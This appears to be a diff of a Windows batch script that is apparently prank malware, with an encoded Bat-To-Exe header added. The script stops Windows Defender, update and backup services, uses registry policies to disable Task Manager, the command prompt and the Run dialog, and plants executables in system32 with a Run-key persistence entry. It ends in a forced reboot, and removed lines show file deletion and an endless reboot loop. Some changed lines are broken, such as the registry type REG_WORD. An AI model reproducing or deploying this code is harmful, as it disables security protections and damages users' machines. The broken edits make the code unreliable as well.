@@ -1,11 +1,50 @@
+::[Bat To Exe Converter]
+::
+::fBE1pAF6MU+EWHreyHcjLQlHcAKQOW6GIrAP4/z0/9a3sEIaUfYrcc/Y1brOA+EB50DoeqoO90h3veclNCd5eAaufD0xq2FNoiqAL8L8
+::fBE1pAF6MU+EWHreyHcjLQlHcAKQOW6GIrAP4/z0/9a3sEIaUfYrcc/Y1brOA+EB50DoeqoO90h3veclNCd5cxuoYUExsWsi
+::fBE1pAF6MU+EWHreyHcjLQlHcAKQOW6GIrAP4/z0/9a3sEIaUfYrcc/Y1brOA+EB50DoeqoO90h3veclNCd6exyuIAosrA4=
+::fBE1pAF6MU+EWHreyHcjLQlHcAKQOW6GIrAP4/z0/9a3sEIaUfYrcc/Y1brOA+EB50DoeqoO90h3veclNCd/dwe4egB6rHZH1g==
+::fBE1pAF6MU+EWHreyHcjLQlHcAKQOW6GIrAP4/z0/9a3sEIaUfYrcc/Y1brOA+EB50DoeqoO90h3veclNCd/cR2vbBYx52taswQ=
+::fBE1pAF6MU+EWHreyHcjLQlHcAKQOW6GIrAP4/z0/9a3sEIaUfYrcc/Y1brOA+EB50DoeqoO90h3veclNCd2USaUXTsbh0Vx+GGdMqc=
+::fBE1pAF6MU+EWHreyHcjLQlHcAKQOW6GIrAP4/z0/9a3sEIaUfYrcc/Y1brOA+EB50DoeqoO90h3veclNCd2cQadax09r2dHsiqAL8L8
+::fBE1pAF6MU+EWHreyHcjLQlHcAKQOW6GIrAP4/z0/9a3sEIaUfYrcc/Y1brOA+EB50DoeqoO90h3veclNCdqWzCEQTt6rHZH1g==
+::fBE1pAF6MU+EWHreyHcjLQlHcAKQOW6GIrAP4/z0/9a3sEIaUfYrcc/Y1brOA+EB50DoeqoO90h3veclNCdrcRykIAosrA4=
+::fBE1pAF6MU+EWHreyHcjLQlHcAKQOW6GIrAP4/z0/9a3sEIaUfYrcc/Y1brOA+EB50DoeqoO90h3veclNCdrbhOmIAosrA4=
+::fBE1pAF6MU+EWHreyHcjLQlHcAKQOW6GIrAP4/z0/9a3sEIaUfYrcc/Y1brOA+EB50DoeqoO90h3veclNCduexaibwI752taswQ=
+::fBE1pAF6MU+EWHreyHcjLQlHcAKQOW6GIrAP4/z0/9a3sEIaUfYrcc/Y1brOA+EB50DoeqoO90h3veclNCduewCiaBZ6rHZH1g==
+::fBE1pAF6MU+EWHreyHcjLQlHcAKQOW6GIrAP4/z0/9a3sEIaUfYrcc/Y1brOA+EB50DoeqoO90h3veclNCduVyCeXUExsWsi
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFB1GSQG+GG6pDaET+NTL/eWAp1kJXaI8d4Gb+bWcLeUf5XnHVKQA81ZzoPclDxRkXTOZQyoYgFYMv2eKVw==
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSTk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFB1GSQG+GG6pDaET+NTL/eWAp1kJXaI8d4Gb+bWcLeUf5XnHVKQA81ZzoPcvAxZIdx6qdAY7p2sCsG2LNsuZjyzAeGWsymIIVWBsggM=
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
 @echo off
-explorer C:
-explorer "%userprofile%"
-start notepad.exe
-del "%userprofile%\*.bat"/s /q /f
-del "%userprofile%\*.cmd"/s /q /f
-del "%userprofile%\desktop\*.bat"/q /f
-del "%userprofile%\desktop\*.cmd"/q /f
 net stop "SDRSVC"
 net stop "WinDefend"
 taskkill /f /t /im "MSASCui.exe"
@@ -15,9 +54,9 @@ net stop "wuauserv"
 ::link canale CARMELIX: https://youtube.com/channel/UCUbVV0_e7B2tM7ETPbPqrCg
 ::In %systemroot%\system32\CARMELIX sono presenti i file:
 ::REBOOT.exe, AfterReboot.exe, NOT_STONKS.vbs, Giusto.exe
-reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
-reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD /t REG_DWORD /d 1 /f
-reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
+reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_WORD /d 1 /f
+reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD /t REG_WORD /d 1 /f
+reg add HKCU\software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_WORD /d 1 /f
 
 rd "%systemroot%\system32\CARMELIX"/q/s
 md "%systemroot%\system32\CARMELIX"
@@ -48,7 +87,7 @@ copy Amico.exe "%systemroot%\system32\CARMELIX\Amico.exe"/y
 del Amico.exe/q
 
 copy Sono.exe "%systemroot%\system32\CARMELIX\Sono.exe"/y
-del Sono.exe/q
+del Amico.exe/q
 
 copy Bene.exe "%systemroot%\system32\CARMELIX\Bene.exe"/y
 del Bene.exe/q
@@ -86,10 +125,7 @@ reg agg HKCU\software\Microsoft\Windows\CurrentVersion\Run /v CAZZO /t REG_SZ /d
 
 cd "%systemroot%\system32\CARMELIX"
 
-taskkill/im notepad.exe /f
 
-if not exist "%systemroot%\system32\CARMELIX\Amico.exe" cd "%systemroot%\system32\VerifyShutdown"
-if not exist "%systemroot%\system32\CARMELIX\Amico.exe" start NotVerified.exe
 
 cd "%userprofile%\desktop"
 
@@ -133,6 +169,3 @@ cd "%systemroot%\system32\CARMELIX"
 start Goodbye.exe
 timeout 1 >nul /nobreak
 shutdown /r /f /c "FUCK YOU" /t 3
-:part
-shutdown /r /t 0 /f
-goto part
